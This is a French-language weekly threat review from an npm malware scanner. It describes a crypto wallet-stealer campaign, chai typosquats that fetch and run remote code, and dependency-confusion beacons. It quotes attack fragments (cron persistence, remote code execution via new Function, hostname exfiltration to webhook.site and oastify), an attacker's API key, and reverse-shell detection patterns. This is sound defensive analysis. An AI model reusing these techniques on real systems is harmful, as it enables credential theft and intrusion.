# Security Review MUAD'DIB — HEBDO

**Mode:** HEBDO
**Période:** 2026-07-14 → 2026-07-16 (3 jours complets ; 07-17 en cours exclu)
**Date rapport:** 2026-07-17
**Modèle:** Fable 5 → basculé Opus 4.8 par le garde-fou dual-use (contenu malware). Analyse défensive, aucune modification de `src/`.

---

## 1. Inventaire de la période

| Jour | Scans archivés (JSON) | Avec tarball |
|------|----------------------:|-------------:|
| 2026-07-14 | 7 569 | 4 229 |
| 2026-07-15 | 7 508 | 4 144 |
| 2026-07-16 | 7 926 | 4 396 |
| **Total** | **22 999** | **12 769** |

Distribution scores stable sur les 3 jours (~1 530 en 90-100, ~330 en 80-89, ~11 800 en 20-49). Déjà couverts dans `all-review-results.json` avant cet hebdo : 69 packages. Couverture cumulée de départ : 4 491 → **4 526** à ce stade.

Méthode : index règles-rares (précis) + Bucket B stratifié deep-read + chasse de signature de campagne + Bucket A (harvest de hooks). Sweep de contenu Tier-1/2 lancé puis arrêté (114 K hits / 4 000 tarballs = trop bruyant sans couplage) ; remplacé par des passes ciblées.

---

## 2. Verdicts MALWARE (tous cross-checkés npm)

**Tous les MALWARE de cette période sont déjà unpublished (404) — npm takedown = confirmation. Aucun rapport npm à soumettre (rien de LIVE).**

### 2.1 Campagne `phantom-syncd` — crypto wallet-stealer (NOUVELLE, sévérité HIGH)

Packages **crypto-themed** (leurre ciblant les devs crypto). 6 noms, 14 versions confirmées (07-14/15 ; chasse 07-16 en cours) :
`abi-encode` (1.0.0/1/2), `arb-kit` (1.0.0), `base58-utils` (1.0.0/1/3/4), `eth-dev` (1.0.0/1/2), `layer2-sdk` (1.0.0/1), `solana-key-utils` (1.0.0).

**Mécanisme :**
1. Loader runtime dans `index.js` (délai 37 s, pas un install-hook) → décode un payload caché dans `test/fixtures/keypairs.dat` (base64) → écrit `~/.cache-db/.node-sync/syncd.js`.
2. Persistance : cron `0 */12 * * *` déguisé (`grep -v syncd`) sur Linux, `schtasks /tn WinNodeSync` sur Windows ; puis `spawn('node',[syncd.js],{detached}).unref()`.
3. Stage 2 (« phantom syncd v3 — topo durmiente », commentaires espagnols) : scanne le disque (`.env/.pem/.key/.keystore/.json`) pour seed phrases / clés privées / keystores (`seed,mnemonic,metamask,phantom,ledger,trezor,PRIVATE_KEY,MNEMONIC…`) → **exfiltration via IPFS/Pinata** (`pinata_api_key`/`pinata_secret_api_key` hardcodés) + config C2 sur dead-drops IPFS. Évasion : idle-detection 15 min + sleep 12 h.

**IOC :** clés Pinata hardcodées (`13c766575b9270a9825d` / secret), dossier `~/.cache-db/.node-sync/`, tâche `WinNodeSync`, CIDs IPFS dead-drops.

**Détection MUAD'DIB :** ces packages étaient correctement scorés **100** dans l'archive (`detached_credential_exfil`, `silent_stealth_process`, `suspicious_dataflow`…) — **pas un faux négatif**. La valeur de la review = confirmation + cartographie de campagne + découverte du miss d'ingestion (§2.1bis). Gap mineur : la ligne `crontab … grep -v syncd` en clair dans `index.js` n'a pas déclenché `crontab_systemd_write` (loader vu, persistance non catégorisée).

### 2.1bis — Corroboration externe & couverture des plateformes

- **Xygeni** a publié le write-up « **PhantomSync** » le **2026-07-14** (3 jours avant cette review). Même mécanisme exact (fixture base64 → collecte wallet keys/seed/secrets → **exfil chiffrée RSA vers IPFS/Pinata**), mêmes commentaires espagnols (« *Ejecutar topo en background* »). Ils listent **8 noms**.
- **In-archive MUAD'DIB : 7 des 8 noms** confirmés — les 6 de la fenêtre (`abi-encode`, `arb-kit`, `base58-utils`, `eth-dev`, `layer2-sdk`, `solana-key-utils`) **+ `eth-wallet-helpers@1.0.0`** trouvé au cross-check (archivé le **2026-07-13**, veille de la fenêtre — hors scope de la chasse initiale).
- **`crypto-validate-lib` = MISS D'INGESTION** (8ᵉ nom Xygeni). npm confirme son existence et son takedown (unpublished 2026-07-14T17:23:47) mais **aucune trace dans `archive/` sur aucun jour** → jamais fetché par le monitor. Blind-spot d'ingestion (takedown-avant-fetch ou jamais mis en queue), **pas un échec de détection**. Non reviewable (pas de tarball).
- **Aikido / Socket / OSM** : pas de write-up spécifique PhantomSync trouvé (Aikido occupé sur AsyncAPI-compromise 07-14, debug/chalk). OSM a des variants `chai-*` (`chai-use-test`) mais pas phantom-syncd.
- **Découverte indépendante** : MUAD'DIB a retrouvé la campagne le 17 par méthode différente (heuristiques + règles-rares + deep-review manuelle package-par-package), là où le cluster FP « AI-agent » la masquait.

**Recommandation :** seeder les IOC phantom-syncd (clés Pinata, `~/.cache-db/.node-sync/`, `WinNodeSync`, marqueur `topo durmiente`) dans `iocs-compact.json` pour catch automatique des variants futurs. Investiguer pourquoi `crypto-validate-lib` n'a pas été ingéré (fenêtre OSM API vs takedown 07-14 17:23).

### 2.2 Campagne `chai-typosquat-tiiny-rce` — RCE staged loader (HIGH)

Typosquats de `chai` (code `pino` repackagé). 4 versions : `chai-as-verified@7.1.5`, `chai-assertix@7.0.6`, `chai-assertions-plus@6.0.4` et `@6.0.5`.
`index.js` (middleware) spawn détaché `lib/initializeCaller.js` → `axios.get(<C2 tiiny.site>)` → `new Function/Function.constructor("require", response.data.cookie)(require)` = exécution de code distant. C2 rotatif : `tomato-brunhilda-40.tiiny.site`, `amethyst-lorrin-26.tiiny.site`. 5 retries. Un package/jour du 14 au 16.

**Corroboration :** même campagne trackée sous d'autres variants — **O3 Security** (`chai-as-forgeted`) et **Snyk** (`chai-as-streamed`). Les 4 noms trouvés ici (`chai-as-verified`, `chai-assertix`, `chai-assertions-plus` ×2) sont des variants non listés par eux → couverture complémentaire.

### 2.3 Campagne beacons dep-confusion (MEDIUM)

Install-hooks exfiltrant l'identité host vers OOB jetable, versions `9.9.9`/`999` :
- `elsisi-cli@9.9.9` — pre+postinstall `wget $(pwd)`/`$(hostname)` → webhook.site
- `ac-raf-emitter@3.0.1` — preinstall `curl POST $(hostname)` → webhook.site
- `home-mp-commons@999.0.1` — postinstall `https.request hostname` → oastify (Burp Collaborator)

---

## 3. Verdicts UNCERTAIN (impact faible / intent non résolu)

- `better-md@99.0.0`, `some-tool-package@99.0.0` — PoC dep-confusion console-only (impact nul).
- `content-common@99.9.9` — preinstall `http.get(oastify)` sans donnée (ping nu).
- `codex-rtl@1.4.0` — patcher asar Electron (widget RTL persan) ; invasif, aucune exfil.
- `@hubspot/prettier-plugin-hubl@0.3.4` — vrai plugin ; seed IOC CRITICAL sur dép bundlée non-levable depuis l'arbre.
- `animes-scraper@3.0.0` — scraper anime grey-area (upload vidéo, pas de secrets).
- `create-egregore@0.19.0` — SaaS dev légit + telemetry (infra propre).
- `@askalf/strongroom@0.1.1` — dép git même-auteur pinnée (redstamp non inspecté).
- `entracte-opencode@0.1.1` — adware « AI credits » (credentials propres).

---

## 4. Verdicts FP notables (avec pattern)

- `skillmoo@0.3.9` — **scanner de sécurité** : ses regex de détection (`mkfifo|sh`, `/dev/tcp`, `nc -e`) matchées comme payload (`defensive_tool_credential_scan`).
- `systeminformation@5.31.17` — `recon_exfil_direct_ip` sur `8.8.8.8` (DNS test connectivité). Package légitime, vrai auteur.
- `netcontrol-agent@1.0.5` — agent monitoring self-install légitime (AUTO_UPDATE opt-in checksum-vérifié).
- `codexmate@0.1.3` — CLI LLM, `curl install.sh|bash` = son propre self-update.
- `ruvnet-brain@2.8.0` — framework rUv ; ntfy.sh = notifications, base64 = helper bundlé.

**Faux positifs de la chasse de campagne (vérifiés, exclus)** : `planu__cli`, `adtrackify__at-service-common`, `brokk-bifrost-searchtools`, `distrohelena__canton-explorer` — string `cache-db`/`node-sync` fortuite, pas de loader.

---

## 5. Bucket A — hooks d'install (COMPLET)

Harvest de tous les `package.json` de la période : **4 945 hooks** d'install (`preinstall`/`install`/`postinstall`/`prepare`/`prepublishOnly`) → 776 BUILD, 579 DANGER-brut, 3 590 OTHER. Tight-filter (fetch+exec réel / `|sh` / decode+exec / persistance cron-schtasks / creds→réseau), exclusion des guards bénins (version-checks Node/bun, rebuild `better-sqlite3`, husky, node-gyp, `check-workspace`, instructions d'install dans strings d'erreur) :

**→ 0 nouveau hook dangereux.** Seul hit résiduel : `@talmolab/sleap-io.js@0.5.4/0.5.5` = guard de version bun (`curl|bash` dans une **string d'erreur** d'instructions, non exécuté) → FP.

Les seuls hooks réellement malveillants de la période sont les **beacons dep-confusion** (`elsisi-cli`, `ac-raf-emitter`, `home-mp-commons`, `content-common`), déjà capturés via l'index règles-rares (§2.3 / §3). Les autres malwares passent par des loaders **runtime** (`index.js`), pas par les hooks d'install.

## 5bis. Audit shell / reverse-shell

79 packages à règle shell sur la période ; 7 forts/hauts-scores lus (72 en bande basse 16-30, non-alertants, non lus individuellement) :
- **`@coze/cli`, `@vm0/cli`, `@fetch-client/cli`** (score 100 `reverse_shell`) → **FP** : la règle tire sur la co-présence `net.connect` (lib undici/proxy bundlée) + `child_process`, sans câblage socket→stdio de shell. `spawn/exec` réels bénins (`powershell -Command`, `npm config get registry`, `sw_vers`). `@fetch-client` a 0 `child_process`.
- **`akm-cli`** (94), **`@talmolab/sleap-io.js`** (89) → **FP** : `curl|bash` dans strings d'erreur d'install, non exécuté.
- **`agent-threat-rules`** (20), **`skillmoo`** → **FP** : rulesets/scanners sécu, `/dev/tcp`·`nc -e` = leur corpus de détection.

**Aucun vrai reverse shell trouvé dans l'ensemble revu.** ⚠️ `reverse_shell` sur-tire (score 100 sur CLI légitimes) — candidat fix à mesurer (exiger le bridge socket→shell réel, pas la co-présence).

---

## 6. Métriques cumulées

`all-review-results.json` : **4 534** entrées (départ 4 491, +43 cet hebdo). Compteurs : **104 MALWARE / 4 303 FP / 76 UNCERTAIN / 1 INGESTION_MISS** / 39+9+2 PENTEST.

Détection : tous les malwares **ingérés** de la période scoraient 100 (pas de faux négatif). Le seul malware « passé » est `crypto-validate-lib` (miss d'ingestion, jamais fetché).

---

## 7. Candidats fix (à mesurer avant implémentation — review only, pas de commit)

1. **`reverse_shell` sur-tire** : score 100 sur CLI légitimes (co-présence `net.connect`+`child_process`). Fix = exiger le câblage socket→stdio de shell. Mesurer ΔFPR sur corpus avant. Même famille que `suspicious_dataflow`.
2. **Gap `crontab_systemd_write`** : persistance cron de phantom-syncd (en clair dans `index.js`) non catégorisée — observabilité, pas un miss (score 100 par ailleurs).
3. **IOC phantom-syncd à seeder** : clés Pinata, `~/.cache-db/.node-sync/`, `WinNodeSync`, marqueur `topo durmiente`.
4. **Ingestion** : investiguer pourquoi `crypto-validate-lib` (takedown 07-14 17:23) n'a jamais été fetché — fenêtre poller OSM vs takedown.

---

## 8. Couverture / limites (honnêteté)

Fait : index règles-rares (complet), Bucket B prioritaire (39/50 + cluster harness lu), chasse campagne (complète), Bucket A hooks (4 945, complet), 7/79 shells forts, cross-check plateformes externes.
**Non fait** : sweep contenu bande-basse complet (abandonné — 114 K hits/4 000 tarballs, trop bruyant sans couplage), 72 shells bande-basse, ~11 Bucket B non-prioritaires. Recall non chiffré (dénominateur inconnu).
